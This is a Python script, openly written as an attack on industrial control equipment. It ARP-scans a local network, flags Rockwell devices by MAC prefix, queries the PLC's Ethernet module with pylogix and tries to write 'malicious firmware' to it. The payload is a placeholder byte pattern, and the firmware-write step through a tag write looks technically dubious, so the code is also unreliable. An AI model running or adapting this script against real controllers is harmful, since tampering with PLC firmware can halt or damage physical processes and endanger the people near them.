from scapy.all import ARP, Ether, srp
from pylogix import PLC
import time

# Function to discover the PLC's IP address on local network
def find_plc_ip(network_range="192.168.1.0/24"):
    """
    Scans the given network range to identify the Rockwell Micro850 PLC.
    """
    print("[*] Scanning Network for PLC...")
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    answered, _ = srp(request, timeout=2, verbose=False)
    
    # Iterate through detected devices
    for sent, received in answered:
        print(f"[+] Found device: {received.psrc} | MAC: {received.hwsrc}")
        
        # Perform a check to see if this matches Rockwell PLC characteristics
        if "00:0E:C6" in received.hwsrc.upper():  # Rockwell OUI prefix
            print(f"[+] Potential Rockwell PLC found at {received.psrc}")
            return received.psrc

    print("[-] No PLC detected.")
    return None

# Function to upload malicious firmware to an Ethernet module
def deploy_malicious_firmware(plc_ip):
    """
    Connects to the PLC and attempts to upload firmware to the Ethernet module.
    """
    if not plc_ip:
        print("[-] No PLC found. Exiting.")
        return
    
    malicious_firmware = b"\xDE\xAD\xBE\xEF" * 100  # Placeholder for binary payload

    print(f"[!] Attempting firmware upload to Ethernet module at {plc_ip}...")

    try:
        with PLC() as comm:
            comm.IPAddress = plc_ip

            # Identify modules connected to the PLC
            module_info = comm.GetModuleProperties(1)  # Query slot 1 (Ethernet module)
            if module_info.Status == "Success":
                print(f"[+] Module ID: {module_info.Value['Product Code']} (Ethernet Module Detected)")
                
                # In a real attack, here we would write the malicious firmware
                result = comm.Write("Ethernet_Module_Firmware", malicious_firmware)

                if result.Status == "Success":
                    print("[+] Malicious firmware uploaded successfully.")
                else:
                    print("[-] Failed to deploy firmware.")

            else:
                print("[-] Unable to retrieve Ethernet module properties.")

    except Exception as e:
        print(f"[!] Error connecting to PLC: {e}")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        deploy_malicious_firmware(plc_ip)